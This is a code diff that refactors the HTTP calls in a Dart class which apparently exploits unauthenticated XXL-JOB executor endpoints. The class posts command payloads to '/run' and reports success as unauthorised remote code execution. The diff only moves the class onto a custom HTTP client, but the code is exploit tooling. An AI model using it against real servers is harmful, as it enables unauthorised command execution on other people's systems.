@@ -1,8 +1,7 @@
 import 'dart:convert';
 
-import 'package:http/http.dart' as http;
-
 import 'exp_result.dart';
+import '../../../core/http/http_client.dart';
 
 class XxlJobExpService {
   final String baseUrl;
@@ -15,6 +14,12 @@ class XxlJobExpService {
 
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
+
+  late final MatrixHttpClient _httpClient = MatrixHttpClient(
+    baseUrl: baseUrl,
+    timeout: timeout,
+    allowBadCertificate: false,
+  );
 
   Future<ExpResult> check() async {
     try {
@@ -32,14 +37,13 @@ class XxlJobExpService {
         'broadcastIndex': 0,
         'broadcastTotal': 0,
       });
-      final res = await http
-          .post(
-            Uri.parse('$_base/run'),
-            headers: {'Content-Type': 'application/json'},
-            body: payload,
-          )
-          .timeout(timeout);
-      if (res.statusCode == 200 && res.body.contains('200')) {
+      final res = await _httpClient.post(
+        '$_base/run',
+        headers: {'Content-Type': 'application/json'},
+        body: payload,
+      );
+      final body = res.body ?? '';
+      if (res.statusCode == 200 && body.contains('200')) {
         return ExpResult(true, 'XXL-JOB 未授权 RCE', '执行器接口未授权，命令提交成功');
       }
     } catch (_) {}
@@ -62,13 +66,11 @@ class XxlJobExpService {
         'broadcastIndex': 0,
         'broadcastTotal': 0,
       });
-      final res = await http
-          .post(
-            Uri.parse('$_base/run'),
-            headers: {'Content-Type': 'application/json'},
-            body: payload,
-          )
-          .timeout(timeout);
+      final res = await _httpClient.post(
+        '$_base/run',
+        headers: {'Content-Type': 'application/json'},
+        body: payload,
+      );
       return res.body;
     } catch (_) {
       return null;
